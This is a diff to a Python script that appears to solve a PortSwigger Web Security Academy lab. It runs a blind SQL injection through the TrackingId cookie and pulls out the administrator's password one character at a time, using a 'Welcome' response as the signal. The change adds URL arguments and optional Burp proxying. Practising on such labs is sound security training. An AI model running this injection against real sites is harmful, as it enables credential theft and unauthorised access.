@@ -1,10 +1,15 @@
 from requests import get, packages
 from string import ascii_lowercase
 from time import sleep
+from sys import argv
 
 packages.urllib3.disable_warnings() 
 
-url="https://acf61f301fa435ba80eb6501006c0034.web-security-academy.net/filter?category=Accessories"
+def usage():
+    print(f"{__file__} <portswiggerURL> [to_burp_proxy]")
+    print("Examples:")
+    print(f"    {__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net")
+    print(f"    {__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net to_burp_proxy")
 
 proxy={
     "https" : "https://127.0.0.1:8080",
@@ -21,7 +26,7 @@ headers={
     "Upgrade-Insecure-Requests": "1"
 }
 
-def brute_force_password_character():
+def brute_force_password_character(url, to_burp_proxy=False):
     password=""
     for i in range(1, 27):
         for char in ascii_lowercase:
@@ -29,8 +34,10 @@ def brute_force_password_character():
                 "TrackingId": "xyz\' UNION SELECT 'a' FROM users WHERE username =" \
                    f"'administrator' and SUBSTRING(password, {i}, 1) = '{char}'--; session=TjAltvk1sHu09kF1gyfeu1LXybsIbwgL"
             }
-            #resp=get(url, headers=headers, cookies=cookie, proxies=proxy, verify=False)
-            resp=get(url, headers=headers, cookies=cookie, verify=False)
+            if proxy == "proxy":
+                resp=get(url, headers=headers, cookies=cookie, proxies=proxy, verify=False)
+            else:
+                resp=get(url, headers=headers, cookies=cookie, verify=False)
             if "Welcome" in resp.text:
                 print("Found Welcome Message!")
                 password+=char
@@ -38,5 +45,13 @@ def brute_force_password_character():
     return password 
 
 if __name__ == "__main__":
-    password=brute_force_password_character()
-    print("Password :",  password)
+    if len(argv) < 2:
+        usage()
+    elif len(argv) == 2:
+        url=argv[1]
+        password=brute_force_password_character(url)
+        print("Password :",  password)
+    elif len(argv) == 3:
+        url=argv[1]
+        password=brute_force_password_character(url, to_burp_proxy=True)
+        print("Password :",  password)
